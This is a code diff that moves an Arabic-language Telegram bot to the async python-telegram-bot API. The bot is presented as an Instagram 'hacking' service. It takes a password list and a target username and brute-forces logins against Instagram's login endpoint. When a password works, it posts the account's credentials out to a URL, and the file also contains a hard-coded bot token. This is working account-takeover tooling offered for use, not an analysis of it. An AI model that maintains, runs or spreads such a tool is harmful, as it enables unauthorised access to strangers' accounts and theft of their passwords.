@@ -1,9 +1,8 @@
-import requests
-from user_agent import generate_user_agent
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler
-from telegram.ext import filters
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
+import requests
 import time
+from user_agent import generate_user_agent
 
 # خلي توكن وايدي جوه
 BOT_TOKEN = "7611194546:AAEPJ_xSoDH3sS3112qQoJH78LIV1jgxkkA"
@@ -17,7 +16,7 @@ report_message = None
 is_running = False
 start_time = None
 
-def start(update, context):
+async def start(update, context):
     chat_id = update.message.chat_id
     welcome_text = f"""⥃ مرحبا بك عزيزي في بوت اختراق محدد | انستا ♯ 
 ⥃ البوت يتميز بخدمة الاختراق و الـ ViP ✰
@@ -32,57 +31,57 @@ def start(update, context):
         [InlineKeyboardButton("⚠️ كيفية الاستخدام⚠️", url="https://t.me/I_e_e_l")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    context.bot.send_message(chat_id=chat_id, text=welcome_text, reply_markup=reply_markup)
+    await context.bot.send_message(chat_id=chat_id, text=welcome_text, reply_markup=reply_markup)
 
-def add_passwords(update, context):
+async def add_passwords(update, context):
     query = update.callback_query
-    query.answer()
-    query.edit_message_text(text="دز ملف الباسوردات بصيغه (txt)")
+    await query.answer()
+    await query.edit_message_text(text="دز ملف الباسوردات بصيغه (txt)")
 
-def handle_file(update, context):
+async def handle_file(update, context):
     global passwords
     file = update.message.document
     if file:
         file_id = file.file_id
-        file_obj = context.bot.get_file(file_id)
-        file_content = file_obj.download_as_bytearray().decode('utf-8')
-        passwords = file_content.splitlines()
-        update.message.reply_text(f"تمت إضافة {len(passwords)} كلمة مرور")
+        file_obj = await context.bot.get_file(file_id)
+        file_content = await file_obj.download_as_bytearray()
+        passwords = file_content.decode('utf-8').splitlines()
+        await update.message.reply_text(f"تمت إضافة {len(passwords)} كلمة مرور")
 
-def start_bruteforce(update, context):
+async def start_bruteforce(update, context):
     global is_running, start_time
     query = update.callback_query
-    query.answer()
-    query.edit_message_text(text="دز يوزر نيم الحساب ب @")
+    await query.answer()
+    await query.edit_message_text(text="دز يوزر نيم الحساب ب @")
     context.user_data["awaiting_username"] = True
     is_running = True
     start_time = time.time()
 
-def stop_bruteforce(update, context):
+async def stop_bruteforce(update, context):
     global is_running
     query = update.callback_query
-    query.answer()
+    await query.answer()
     is_running = False
     elapsed_time = int(time.time() - start_time)
-    query.edit_message_text(
+    await query.edit_message_text(
         text=f"تم إيقاف الاختراق\n\n"
              f"محاولات فاشلة: {failed_attempts}\n"
              f"محاولات صحيحة: {successful_attempts}\n"
              f"مدة التشغيل: {elapsed_time} ثانية"
     )
 
-def handle_username(update, context):
+async def handle_username(update, context):
     global target_user, failed_attempts, successful_attempts, report_message
     if context.user_data.get("awaiting_username"):
         target_user = update.message.text
         failed_attempts = 0
         successful_attempts = 0
         chat_id = update.message.chat_id
-        report_message = context.bot.send_message(chat_id=chat_id, text="بدء الاختراق...\n\nمحاولات فاشلة: 0\nمحاولات صحيحة: 0\nكلمات المرور المتبقية: 0")
+        report_message = await context.bot.send_message(chat_id=chat_id, text="بدء الاختراق...\n\nمحاولات فاشلة: 0\nمحاولات صحيحة: 0\nكلمات المرور المتبقية: 0")
         context.user_data["awaiting_username"] = False
-        brute_force(chat_id, context.bot)
+        await brute_force(chat_id, context.bot)
 
-def brute_force(chat_id, bot):
+async def brute_force(chat_id, bot):
     global passwords, target_user, failed_attempts, successful_attempts, report_message, is_running
     url = 'https://www.instagram.com/accounts/login/ajax/'
     headers = {
@@ -119,7 +118,7 @@ def brute_force(chat_id, bot):
 user →: {target_user} 
 pass →: {password}'''
             requests.post(send)
-            bot.edit_message_text(
+            await bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=report_message.message_id,
                 text=f"محاولات فاشلة: {failed_attempts}\nمحاولات صحيحة: {successful_attempts}\nكلمات المرور المتبقية: {len(passwords)}"
@@ -128,23 +127,21 @@ pass →: {password}'''
         else:
             failed_attempts += 1
             passwords.remove(password)
-            bot.edit_message_text(
+            await bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=report_message.message_id,
                 text=f"محاولات فاشلة: {failed_attempts}\nمحاولات صحيحة: {successful_attempts}\nكلمات المرور المتبقية: {len(passwords)}"
             )
 
-    bot.send_message(chat_id, "انتهت العمليه 🕑")
+    await bot.send_message(chat_id, "انتهت العمليه 🕑")
 
-updater = Updater(BOT_TOKEN, use_context=True)
-dp = updater.dispatcher
+application = Application.builder().token(BOT_TOKEN).build()
 
-dp.add_handler(CommandHandler("start", start))
-dp.add_handler(CallbackQueryHandler(add_passwords, pattern="add_passwords"))
-dp.add_handler(CallbackQueryHandler(start_bruteforce, pattern="start_bruteforce"))
-dp.add_handler(CallbackQueryHandler(stop_bruteforce, pattern="stop_bruteforce"))
-dp.add_handler(MessageHandler(filters.document, handle_file))
-dp.add_handler(MessageHandler(filters.text & ~filters.command, handle_username))
+application.add_handler(CommandHandler("start", start))
+application.add_handler(CallbackQueryHandler(add_passwords, pattern="add_passwords"))
+application.add_handler(CallbackQueryHandler(start_bruteforce, pattern="start_bruteforce"))
+application.add_handler(CallbackQueryHandler(stop_bruteforce, pattern="stop_bruteforce"))
+application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username))
 
-updater.start_polling()
-updater.idle()
+application.run_polling()
